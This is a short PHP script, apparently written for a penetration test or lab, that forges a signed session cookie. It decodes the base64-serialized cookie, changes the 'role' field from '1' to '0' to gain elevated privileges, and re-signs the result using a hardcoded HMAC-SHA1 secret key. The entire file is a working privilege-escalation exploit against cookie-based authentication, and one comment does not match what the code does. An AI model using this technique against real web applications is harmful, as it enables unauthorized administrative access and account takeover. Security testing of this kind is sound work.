<?php
// Original cookie
$cookie = 'YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoicGVudGVzdCI7czo0OiJyb2xlIjtzOjE6IjEiO30%3D.0b2de12b4659f3c0f645327124d8fa85a3dc9697';

list($encoded_data, $hash) = explode('.', $cookie);

// Decode from URL format
$base64_encoded = urldecode($encoded_data);
// echo "Base64 Encoded Data: " . $base64_encoded . "\n";

// Decode from Base64
$serialized_data = base64_decode($base64_encoded);
// echo "Serialized Data: " . $serialized_data . "\n";

// Unserialize the data
$original_array = unserialize($serialized_data);

// Modify the array: change username to 'admin'
$original_array['id'] = '3';
$original_array['username'] = 'pentest';
$original_array['role'] = '0'; # CHANGE THE ROLE

// Serialize the modified array
$modified_serialized_data = serialize($original_array);
echo "Modified Serialized Data: " . $modified_serialized_data . "\n";

// Base64 encode the serialized data
$modified_base64_encoded = base64_encode($modified_serialized_data);
// echo "Modified Base64 Encoded Data: " . $modified_base64_encoded . "\n";

// Secret key (not encoded)
$secret_key = '@pp_s3cret!!';

// Generate the hash using SHA1 and the serialized data (not Base64 encoded)
$calculated_hash = hash_hmac('sha1', $modified_serialized_data, $secret_key);
// echo "Calculated Hash: " . $calculated_hash . "\n";

// Create the new cookie
$new_cookie = $modified_base64_encoded . '.' . $calculated_hash;
echo "New Cookie: " . $new_cookie . "\n";
?>
